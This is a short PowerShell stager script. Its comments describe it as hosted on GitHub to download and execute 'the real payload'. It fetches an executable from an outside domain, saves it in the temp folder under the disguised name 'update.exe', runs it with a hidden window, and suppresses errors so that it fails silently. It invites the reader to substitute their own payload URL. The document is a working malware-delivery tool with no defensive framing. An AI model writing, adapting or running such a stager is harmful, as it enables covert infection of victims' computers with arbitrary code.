# This is the stager script hosted on GitHub.
# Its job is to download and execute the real payload.

# --- IMPORTANT ---
# Replace this with the URL to your final .exe payload
 $PayloadUrl = "https://avrasyaturizm.net/temp/calc.exe"

# Define a destination path in the temp folder
 $Destination = "$env:TEMP\update.exe"

# Download the payload using a common command
try {
    Invoke-WebRequest -Uri $PayloadUrl -OutFile $Destination -ErrorAction Stop
    
    # Execute the downloaded file silently
    Start-Process -FilePath $Destination -WindowStyle Hidden
    
} catch {
    # Optional: Handle errors if the download fails
    # For now, it will just fail silently if the URL is bad
}
